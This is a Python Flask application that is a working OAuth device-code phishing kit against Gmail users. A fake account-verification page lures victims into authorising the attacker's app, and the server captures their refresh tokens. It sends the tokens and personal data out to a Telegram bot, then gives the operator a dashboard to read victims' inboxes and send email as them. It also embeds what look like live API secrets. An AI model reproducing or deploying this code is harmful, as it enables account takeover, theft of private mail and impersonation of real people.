from flask import Flask, request, redirect, session, render_template_string, Response
import requests
import json
import os
import base64
import re
from datetime import datetime
from urllib.parse import urlparse, urlencode, parse_qs, urlunparse

app = Flask(__name__)
app.secret_key = os.urandom(24)

# ================================================================
# YOUR GOOGLE OAUTH CREDENTIALS (same as before)
# ================================================================
CLIENT_ID = "870868575995-luhgcleqlgjb28tckh6tmidfea3vc3dp.apps.googleusercontent.com"
CLIENT_SECRET = "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"
RENDER_URL = os.environ.get("RENDER_URL", "https://gmail-oauth.onrender.com")

# ================================================================
# TELEGRAM CONFIG
# ================================================================
TG_BOT_TOKEN = "8347968051:AAEThb_Nmqy-bhdsZwmEnsBSQgXVc-fGYbs"
TG_CHAT_ID = "7554731151"

# ================================================================
# TOKEN STORAGE
# ================================================================
TOKEN_DB = "/tmp/tokens.json"
INTERCEPTED_DB = "/tmp/intercepted.json"

def send_telegram(message):
    url = f"https://api.telegram.org/bot{TG_BOT_TOKEN}/sendMessage"
    payload = {"chat_id": TG_CHAT_ID, "text": message, "parse_mode": "Markdown"}
    try:
        requests.post(url, json=payload, timeout=10)
    except:
        pass

def save_intercepted(data_type, data, ip):
    """Save intercepted OAuth data"""
    db = {}
    if os.path.exists(INTERCEPTED_DB):
        with open(INTERCEPTED_DB) as f:
            db = json.load(f)
    
    entry = {
        "type": data_type,
        "data": data,
        "ip": ip,
        "timestamp": datetime.now().isoformat()
    }
    
    # Use a unique key
    key = f"{data_type}_{datetime.now().timestamp()}"
    db[key] = entry
    
    with open(INTERCEPTED_DB, "w") as f:
        json.dump(db, f, indent=2)
    
    # Send to Telegram
    msg = f"""[+]___ OAuth_INTERCEPTED ___[+]
Type: {data_type}
IP: {ip}
Data: {json.dumps(data, indent=2)[:500]}"""
    send_telegram(msg)
    
    print(f"[+] Intercepted {data_type}")

def save_token(email, refresh_token, access_token, ip):
    db = {}
    if os.path.exists(TOKEN_DB):
        with open(TOKEN_DB) as f:
            db = json.load(f)
    
    db[email] = {
        "refresh_token": refresh_token,
        "access_token": access_token,
        "ip": ip,
        "timestamp": datetime.now().isoformat(),
        "method": "aitm_proxy"
    }
    
    with open(TOKEN_DB, "w") as f:
        json.dump(db, f, indent=2)
    
    msg = f"""[+]___ GMAIL_OAUTH ___[+]
Victim: {email}
Token: {refresh_token}
IP: {ip}"""
    send_telegram(msg)
    
    print(f"[+] Captured token for {email}")

# ================================================================
# HOME
# ================================================================
@app.route('/')
def home():
    return """
    <html><body>
    <h2>Gmail Access Tool</h2>
    <p><a href='/auth/gmail'>Authorize Gmail Access</a></p>
    </body></html>
    """

# ================================================================
# AiTM PROXY — Landing page for victim
# ================================================================
@app.route('/auth/gmail')
def auth_gmail():
    """Landing page that looks legitimate, then initiates proxy auth"""
    return render_template_string("""
    <!DOCTYPE html>
    <html>
    <head>
        <title>Verify Your Account</title>
        <style>
            body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;
                 background:#f0f2f5;display:flex;justify-content:center;align-items:center;
                 height:100vh;margin:0}
            .card{background:white;padding:40px;border-radius:12px;box-shadow:0 2px 12px rgba(0,0,0,0.1);
                  max-width:400px;text-align:center}
            .btn{background:#4285f4;color:white;padding:12px 30px;border:none;border-radius:6px;
                 font-size:16px;cursor:pointer;text-decoration:none;display:inline-block;margin-top:20px}
            .btn:hover{background:#3367d6}
            .logo{font-size:40px;margin-bottom:15px}
            h2{color:#1a1a1a;margin-bottom:8px}
            p{color:#666;font-size:14px;line-height:1.5}
        </style>
    </head>
    <body>
        <div class="card">
            <div class="logo">🔐</div>
            <h2>Account Verification Required</h2>
            <p>To continue using this service, you need to verify your Gmail account access.</p>
            <p style="font-size:13px;color:#999">This is required for security purposes.</p>
            <a href="/proxy/auth" class="btn">Continue with Google</a>
        </div>
    </body>
    </html>
    """)

# ================================================================
# STEP 1: Initiate proxy OAuth flow
# ================================================================
@app.route('/proxy/auth')
def proxy_auth():
    """
    Instead of redirecting to Google directly, we'll go through 
    the device code flow which we can intercept cleanly.
    The victim stays on our domain the entire time.
    """
    # Request a device code from Google
    resp = requests.post('https://oauth2.googleapis.com/device/code', data={
        'client_id': CLIENT_ID,
        'scope': 'openid email profile https://www.googleapis.com/auth/gmail.readonly https://mail.google.com/'
    })
    device_data = resp.json()
    
    # Store everything in session
    session['device_code'] = device_data['device_code']
    session['user_code'] = device_data['user_code']
    session['verification_url'] = device_data['verification_url']
    
    # INTERCEPT: Save the device code details
    save_intercepted("device_code_request", {
        "device_code": device_data['device_code'][:20] + "...",
        "user_code": device_data['user_code'],
        "expires_in": device_data.get('expires_in'),
        "verification_url": device_data['verification_url']
    }, request.headers.get("X-Forwarded-For", request.remote_addr))
    
    # Show the user the Google device page
    return render_template_string("""
    <!DOCTYPE html>
    <html>
    <head>
        <title>Verify Your Account</title>
        <style>
            body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;
                 background:#f0f2f5;display:flex;justify-content:center;align-items:center;
                 height:100vh;margin:0}
            .card{background:white;padding:40px;border-radius:12px;box-shadow:0 2px 12px rgba(0,0,0,0.1);
                  max-width:480px;text-align:center}
            .step{background:#f8f9fa;border-radius:8px;padding:15px;margin:15px 0;text-align:left}
            .code{font-size:32px;font-weight:bold;background:#e8f0fe;padding:15px 25px;
                  display:inline-block;letter-spacing:8px;border-radius:6px;margin:10px 0;
                  font-family:'Courier New',monospace;color:#1a73e8}
            .btn{background:#4285f4;color:white;padding:12px 30px;border:none;border-radius:6px;
                 font-size:16px;cursor:pointer;text-decoration:none;display:inline-block}
            .btn:hover{background:#3367d6}
            h2{color:#1a1a1a}
            .note{color:#999;font-size:12px;margin-top:15px}
            .loader{display:inline-block;width:20px;height:20px;border:3px solid #e0e0e0;
                    border-top:3px solid #4285f4;border-radius:50%;animation:spin 1s linear infinite;
                    margin-right:8px;vertical-align:middle}
            @keyframes spin{0%{transform:rotate(0deg)}100%{transform:rotate(360deg)}}
        </style>
    </head>
    <body>
        <div class="card">
            <h2>Verify Your Google Account</h2>
            <p style="color:#666">Follow the steps below to complete verification</p>
            
            <div class="step">
                <strong>Step 1:</strong> Open Google's verification page
                <br><br>
                <a href="{{ verification_url }}" target="_blank" class="btn">
                    Open google.com/device
                </a>
            </div>
            
            <div class="step">
                <strong>Step 2:</strong> Enter this code
                <br>
                <div class="code">{{ user_code }}</div>
            </div>
            
            <div class="step">
                <strong>Step 3:</strong> Click "Continue" and authorize
                <br><br>
                <span class="loader"></span>
                <span style="color:#666">Waiting for verification...</span>
            </div>
            
            <p class="note">This page will automatically check for authorization.</p>
        </div>
        <script>
            setTimeout(function(){ window.location.href = '/proxy/poll'; }, 3000);
        </script>
    </body>
    </html>
    """, user_code=session['user_code'], verification_url=session['verification_url'])

# ================================================================
# STEP 2: Poll for token — THIS IS WHERE WE INTERCEPT
# ================================================================
@app.route('/proxy/poll')
def proxy_poll():
    """
    Poll Google for the token exchange.
    When the user authorizes, Google returns tokens to US,
    and we capture them before the user ever sees.
    """
    device_code = session.get('device_code')
    if not device_code:
        return redirect('/auth/gmail')
    
    victim_ip = request.headers.get("X-Forwarded-For", request.remote_addr)
    if victim_ip and "," in victim_ip:
        victim_ip = victim_ip.split(",")[0].strip()
    
    # Poll Google for token
    resp = requests.post('https://oauth2.googleapis.com/token', data={
        'client_id': CLIENT_ID,
        'client_secret': CLIENT_SECRET,
        'device_code': device_code,
        'grant_type': 'urn:ietf:params:oauth:grant-type:device_code'
    })
    
    token_data = resp.json()
    
    # INTERCEPT: Log the entire response
    save_intercepted("token_poll_response", token_data, victim_ip)
    
    if 'access_token' in token_data:
        # === WE GOT THE TOKENS ===
        refresh_token = token_data.get("refresh_token", "N/A")
        access_token = token_data.get("access_token", "N/A")
        id_token = token_data.get("id_token", "")
        expires_in = token_data.get("expires_in", 3600)
        scope = token_data.get("scope", "")
        token_type = token_data.get("token_type", "")
        
        # INTERCEPT: Save the full token response
        save_intercepted("full_token_response", {
            "has_refresh": refresh_token != "N/A",
            "has_access": True,
            "has_id_token": bool(id_token),
            "expires_in": expires_in,
            "scope": scope,
            "token_type": token_type,
            "refresh_token_prefix": refresh_token[:30] if refresh_token != "N/A" else "none",
            "access_token_prefix": access_token[:30]
        }, victim_ip)
        
        # Get user info
        userinfo = requests.get(
            "https://www.googleapis.com/oauth2/v2/userinfo",
            headers={"Authorization": f"Bearer {access_token}"}
        ).json()
        email = userinfo.get("email", "unknown")
        
        # INTERCEPT: Save user info
        save_intercepted("user_info", userinfo, victim_ip)
        
        # Decode the ID token for additional data
        id_token_data = {}
        if id_token:
            try:
                # JWT is three base64 parts
                parts = id_token.split('.')
                if len(parts) == 3:
                    # Add padding
                    payload = parts[1]
                    payload += '=' * (4 - len(payload) % 4)
                    decoded = base64.urlsafe_b64decode(payload)
                    id_token_data = json.loads(decoded)
                    save_intercepted("id_token_decoded", id_token_data, victim_ip)
            except:
                pass
        
        # Save the token for replay
        save_token(email, refresh_token, access_token, victim_ip)
        
        # Clear session
        session.pop('device_code', None)
        session.pop('user_code', None)
        session.pop('verification_url', None)
        
        # Decoy: redirect to a legitimate-looking page
        return redirect("https://ivview.party/verified")
    
    elif token_data.get('error') == 'authorization_pending':
        # Still waiting — poll again
        return render_template_string("""
        <html><body style="text-align:center;font-family:Arial;margin-top:50px;background:#f0f2f5">
            <div style="background:white;padding:30px;border-radius:12px;max-width:400px;margin:auto">
                <div class="loader" style="display:inline-block;width:30px;height:30px;
                     border:3px solid #e0e0e0;border-top:3px solid #4285f4;border-radius:50%;
                     animation:spin 1s linear infinite;margin:20px"></div>
                <p>Waiting for verification...</p>
                <p style="color:#666;font-size:13px">Code: <strong>{{ user_code }}</strong></p>
                <p style="font-size:12px;color:#999">
                    <a href="{{ verification_url }}" target="_blank">Open google.com/device</a>
                </p>
            </div>
            <style>@keyframes spin{0%{transform:rotate(0deg)}100%{transform:rotate(360deg)}}</style>
        </body></html>
        """, user_code=session.get('user_code', ''), 
            verification_url=session.get('verification_url', ''))
    
    elif token_data.get('error') == 'slow_down':
        # Polling too fast
        return render_template_string("""
        <html><body>
            <p>Checking again shortly...</p>
            <script>setTimeout(function(){window.location.href='/proxy/poll'},8000)</script>
        </body></html>
        """)
    
    elif token_data.get('error') == 'expired_token':
        session.pop('device_code', None)
        return redirect('/auth/gmail')
    
    elif token_data.get('error') == 'access_denied':
        save_intercepted("user_denied", {"error": "user_denied"}, victim_ip)
        return "Authorization canceled. <a href='/auth/gmail'>Try again</a>"
    
    else:
        save_intercepted("unexpected_error", token_data, victim_ip)
        return f"Error. <a href='/auth/gmail'>Try again</a>"

# ================================================================
# VIEW INTERCEPTED DATA (for you to check)
# ================================================================
@app.route('/intercepted')
def view_intercepted():
    """View all intercepted OAuth data"""
    if not os.path.exists(INTERCEPTED_DB):
        return jsonify({})
    with open(INTERCEPTED_DB) as f:
        data = json.load(f)
    
    # Return as pretty HTML
    html = """
    <html><head><style>
        body{font-family:Arial;padding:20px;background:#0d1117;color:#c9d1d9}
        pre{background:#161b22;padding:15px;border-radius:6px;overflow-x:auto}
        .entry{border:1px solid #30363d;border-radius:6px;padding:15px;margin:10px 0}
        .type{color:#58a6ff;font-weight:bold}
        .time{color:#8b949e;font-size:12px}
    </style></head><body>
    <h1>Intercepted OAuth Data</h1>
    """
    
    for key, entry in reversed(list(data.items())):
        html += f"""
        <div class="entry">
            <div class="type">{entry['type']}</div>
            <div class="time">{entry['timestamp']} | IP: {entry['ip']}</div>
            <pre>{json.dumps(entry['data'], indent=2)}</pre>
        </div>
        """
    
    html += "</body></html>"
    return html

# ================================================================
# TOKENS ENDPOINT
# ================================================================
@app.route('/tokens')
def list_tokens():
    if not os.path.exists(TOKEN_DB):
        return jsonify({})
    with open(TOKEN_DB) as f:
        return jsonify(json.load(f))

# ================================================================
# HEALTH
# ================================================================
@app.route('/health')
def health():
    return "OK"

# ================================================================
# VIEWER (same as before)
# ================================================================
@app.route('/viewer')
def viewer():
    return render_template_string("""
    <!DOCTYPE html>
    <html>
    <head>
        <title>Gmail Viewer</title>
        <style>
            body{font-family:Arial;padding:30px;background:#0d1117;color:#c9d1d9;max-width:1000px;margin:auto}
            h1{color:#58a6ff}
            table{width:100%;border-collapse:collapse;margin-top:20px}
            th,td{padding:12px;text-align:left;border-bottom:1px solid #30363d}
            th{color:#8b949e}
            a{color:#58a6ff;text-decoration:none}
            .card{background:#161b22;border:1px solid #30363d;border-radius:6px;padding:12px;margin:8px 0;cursor:pointer}
            .card:hover{border-color:#58a6ff}
            .from{color:#8b949e;font-size:13px}
            .subject{color:#c9d1d9;font-weight:600}
            .snippet{color:#8b949e;font-size:13px;margin-top:4px}
            .btn{background:#238636;color:#fff;padding:8px 16px;border:none;border-radius:6px;cursor:pointer;text-decoration:none;display:inline-block}
            .btn-blue{background:#1f6feb}
            .btn-red{background:#da3633}
            .btn-sm{padding:4px 10px;font-size:12px}
            input,textarea{padding:10px;margin:5px 0;border:1px solid #30363d;border-radius:4px;background:#0d1117;color:#c9d1d9;width:100%;box-sizing:border-box}
            .modal{position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.8);z-index:1000;display:none}
            .modal-content{background:#161b22;margin:40px auto;padding:30px;border-radius:8px;max-width:800px;max-height:80vh;overflow-y:auto;position:relative}
            .close{position:absolute;top:10px;right:20px;font-size:28px;cursor:pointer;color:#8b949e}
            .close:hover{color:#fff}
            .email-body{white-space:pre-wrap;word-break:break-word;font-size:14px;line-height:1.5}
            .email-headers{margin-bottom:20px;padding-bottom:20px;border-bottom:1px solid #30363d}
            .email-headers div{margin:4px 0}
            .label{color:#8b949e;font-weight:bold;display:inline-block;width:80px}
            #send-section{display:none;margin-top:20px;padding:20px;background:#161b22;border:1px solid #30363d;border-radius:6px}
            .tab{margin-bottom:20px}
            .tab button{padding:10px 20px;background:#30363d;color:#c9d1d9;border:none;cursor:pointer;border-radius:4px 4px 0 0}
            .tab button.active{background:#1f6feb;color:#fff}
            .tabcontent{display:none}
            .tabcontent.active{display:block}
            #loading{text-align:center;padding:40px;color:#8b949e}
        </style>
    </head>
    <body>
        <h1>Gmail Viewer</h1>
        <div class="tab">
            <button class="active" onclick="switchTab('tokens')">Captured Tokens</button>
            <button onclick="switchTab('intercepted')">Intercepted Data</button>
        </div>
        
        <div id="tokens" class="tabcontent active">
            <p><button class="btn" onclick="loadTokens()">Refresh Tokens</button></p>
            <div id="token-list"><p>Loading...</p></div>
        </div>
        
        <div id="intercepted" class="tabcontent">
            <p><button class="btn" onclick="loadIntercepted()">Refresh Intercepted</button></p>
            <div id="intercepted-list"><p>Loading...</p></div>
        </div>
        
        <div id="inbox-section" style="display:none;margin-top:20px">
            <h3 style="display:inline-block">Inbox: <span id="inbox-email" style="color:#58a6ff"></span></h3>
            <button class="btn btn-blue" style="float:right" onclick="showSendSection()">Send Email</button>
            <div id="send-section">
                <h4>Send Email as Victim</h4>
                <input id="send-to" placeholder="To: email@example.com">
                <input id="send-subject" placeholder="Subject">
                <textarea id="send-body" rows="4" placeholder="Message body..."></textarea>
                <button class="btn" onclick="sendEmail()">Send</button>
                <button class="btn btn-red" onclick="hideSendSection()">Cancel</button>
                <div id="send-status" style="margin-top:10px;color:#8b949e"></div>
            </div>
            <div id="inbox-content"></div>
        </div>
        
        <div id="email-modal" class="modal" onclick="closeModal(event)">
            <div class="modal-content" onclick="event.stopPropagation()">
                <span class="close" onclick="closeModal()">&times;</span>
                <div id="modal-content"></div>
            </div>
        </div>
        
        <script>
            let currentEmail = '';
            
            function switchTab(name) {
                document.querySelectorAll('.tabcontent').forEach(t => t.classList.remove('active'));
                document.querySelectorAll('.tab button').forEach(b => b.classList.remove('active'));
                document.getElementById(name).classList.add('active');
                event.target.classList.add('active');
            }
            
            async function loadTokens() {
                const r = await fetch('/tokens');
                const d = await r.json();
                let h = '<table><tr><th>Email</th><th>IP</th><th>Time</th><th>Action</th></tr>';
                for (const [e,i] of Object.entries(d)) {
                    h += `<tr><td>${e}</td><td>${i.ip||''}</td><td>${(i.timestamp||'').slice(0,19)}</td>
                        <td><button class="btn btn-blue btn-sm" onclick="viewInbox('${e}')">View Inbox</button></td></tr>`;
                }
                document.getElementById('token-list').innerHTML = h || '<p>No tokens captured yet.</p>';
            }
            
            async function loadIntercepted() {
                const r = await fetch('/intercepted');
                const d = await r.json();
                let h = '';
                for (const [k,v] of Object.entries(d).reverse()) {
                    h += `<div class="card"><strong>${v.type}</strong> at ${v.timestamp}<br>
                          <pre style="font-size:11px">${JSON.stringify(v.data, null, 2)}</pre></div>`;
                }
                document.getElementById('intercepted-list').innerHTML = h || '<p>No intercepted data.</p>';
            }
            
            async function viewInbox(email) {
                currentEmail = email;
                document.getElementById('inbox-section').style.display = 'block';
                document.getElementById('inbox-email').textContent = email;
                document.getElementById('inbox-content').innerHTML = '<div id="loading">Loading inbox...</div>';
                document.getElementById('send-section').style.display = 'none';
                
                const r = await fetch('/api/inbox', {
                    method:'POST', headers:{'Content-Type':'application/json'},
                    body: JSON.stringify({email: email})
                });
                const d = await r.json();
                document.getElementById('inbox-content').innerHTML = d.html || '<p>No emails found.</p>';
            }
            
            async function viewEmail(msgId) {
                document.getElementById('modal-content').innerHTML = '<div id="loading">Loading email...</div>';
                document.getElementById('email-modal').style.display = 'block';
                const r = await fetch('/api/email', {
                    method:'POST', headers:{'Content-Type':'application/json'},
                    body: JSON.stringify({email: currentEmail, msg_id: msgId})
                });
                const d = await r.json();
                document.getElementById('modal-content').innerHTML = d.html || '<p>Could not load email.</p>';
            }
            
            function closeModal(e) {
                if (!e || e.target === document.getElementById('email-modal')) {
                    document.getElementById('email-modal').style.display = 'none';
                }
            }
            
            function showSendSection() {
                document.getElementById('send-section').style.display = 'block';
                document.getElementById('send-status').textContent = '';
            }
            
            function hideSendSection() {
                document.getElementById('send-section').style.display = 'none';
            }
            
            async function sendEmail() {
                const to = document.getElementById('send-to').value;
                const subject = document.getElementById('send-subject').value;
                const body = document.getElementById('send-body').value;
                if (!to || !subject) { document.getElementById('send-status').textContent = 'To and Subject required.'; return; }
                document.getElementById('send-status').textContent = 'Sending...';
                const r = await fetch('/api/send', {
                    method:'POST', headers:{'Content-Type':'application/json'},
                    body: JSON.stringify({email: currentEmail, to, subject, body})
                });
                const d = await r.json();
                document.getElementById('send-status').textContent = d.message || d.error || 'Sent';
            }
            
            loadTokens();
        </script>
    </body>
    </html>
    """)

# ================================================================
# API ENDPOINTS (same as before)
# ================================================================
def get_access_token(email):
    db = {}
    if os.path.exists(TOKEN_DB):
        with open(TOKEN_DB) as f:
            db = json.load(f)
    info = db.get(email)
    if not info:
        return None
    rt = info.get('refresh_token')
    if not rt:
        return None
    resp = requests.post("https://oauth2.googleapis.com/token", json={
        "client_id": CLIENT_ID,
        "client_secret": CLIENT_SECRET,
        "refresh_token": rt,
        "grant_type": "refresh_token"
    })
    if resp.status_code != 200:
        return None
    return resp.json()['access_token']

def decode_base64(data):
    try:
        data = data.replace("-", "+").replace("_", "/")
        padded = data + "=" * (4 - len(data) % 4) if len(data) % 4 else data
        return base64.b64decode(padded).decode("utf-8", errors="replace")
    except:
        return "[Binary content]"

def extract_body(payload):
    if "parts" in payload:
        for part in payload["parts"]:
            if part.get("mimeType") == "text/plain" and "data" in part.get("body", {}):
                return decode_base64(part["body"]["data"])
            elif part.get("mimeType") == "text/html" and "data" in part.get("body", {}):
                return decode_base64(part["body"]["data"])
            if "parts" in part:
                result = extract_body(part)
                if result:
                    return result
    elif "data" in payload.get("body", {}):
        return decode_base64(payload["body"]["data"])
    return "[No readable body]"

def get_header(headers, name):
    for h in headers:
        if h["name"].lower() == name.lower():
            return h["value"]
    return "N/A"

@app.route('/api/inbox', methods=['POST'])
def api_inbox():
    data = request.json
    email = data.get('email', '').strip()
    access_token = get_access_token(email)
    if not access_token:
        return jsonify({"html": "<p>Token expired or not found.</p>"})
    msgs = requests.get(
        "https://gmail.googleapis.com/gmail/v1/users/me/messages",
        params={"maxResults": 30},
        headers={"Authorization": f"Bearer {access_token}"}
    ).json().get("messages", [])
    html = ""
    for msg in msgs[:30]:
        d = requests.get(
            f"https://gmail.googleapis.com/gmail/v1/users/me/messages/{msg['id']}",
            headers={"Authorization": f"Bearer {access_token}"}
        ).json()
        h = d["payload"]["headers"]
        msg_id = msg['id']
        subj = get_header(h, 'Subject')[:80]
        fr = get_header(h, 'From')[:60]
        snippet = d.get('snippet', '')[:150]
        date = get_header(h, 'Date')[:25]
        html += f"""<div class="card" onclick="viewEmail('{msg_id}')">
            <div class="from">{fr} — {date}</div>
            <div class="subject">{subj}</div>
            <div class="snippet">{snippet}</div></div>"""
    return jsonify({"html": html or "<p>No emails found.</p>"})

@app.route('/api/email', methods=['POST'])
def api_email():
    data = request.json
    email = data.get('email', '').strip()
    msg_id = data.get('msg_id', '').strip()
    if not msg_id:
        return jsonify({"html": "<p>No message ID provided.</p>"})
    access_token = get_access_token(email)
    if not access_token:
        return jsonify({"html": "<p>Token expired.</p>"})
    d = requests.get(
        f"https://gmail.googleapis.com/gmail/v1/users/me/messages/{msg_id}",
        params={"format": "full"},
        headers={"Authorization": f"Bearer {access_token}"}
    ).json()
    if 'error' in d:
        return jsonify({"html": f"<p>Error: {d.get('error', {}).get('message', 'Unknown')}</p>"})
    h = d["payload"]["headers"]
    body = extract_body(d["payload"])
    if len(body) > 50000:
        body = body[:50000] + "\n\n...[truncated]..."
    html = f"""
    <div class="email-headers">
        <div><span class="label">From:</span> {get_header(h, 'From')}</div>
        <div><span class="label">To:</span> {get_header(h, 'To')}</div>
        <div><span class="label">Date:</span> {get_header(h, 'Date')}</div>
        <div><span class="label">Subject:</span> {get_header(h, 'Subject')}</div>
    </div>
    <div class="email-body">{body}</div>
    """
    return jsonify({"html": html})

@app.route('/api/send', methods=['POST'])
def api_send():
    data = request.json
    email = data.get('email', '').strip()
    to = data.get('to', '').strip()
    subject = data.get('subject', '').strip()
    body = data.get('body', '').strip()
    if not email or not to or not subject:
        return jsonify({"error": "Missing required fields"}), 400
    access_token = get_access_token(email)
    if not access_token:
        return jsonify({"error": "Token expired."}), 401
    msg = f"From: me\r\nTo: {to}\r\nSubject: {subject}\r\nContent-Type: text/plain; charset=UTF-8\r\n\r\n{body}"
    encoded = base64.urlsafe_b64encode(msg.encode()).decode()
    resp = requests.post(
        "https://gmail.googleapis.com/gmail/v1/users/me/messages/send",
        headers={"Authorization": f"Bearer {access_token}", "Content-Type": "application/json"},
        json={"raw": encoded}
    )
    if resp.status_code == 200:
        return jsonify({"message": f"Email sent to {to}"})
    else:
        return jsonify({"error": f"Failed: {resp.text[:300]}"}), 500

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 10000))
    app.run(host="0.0.0.0", port=port)
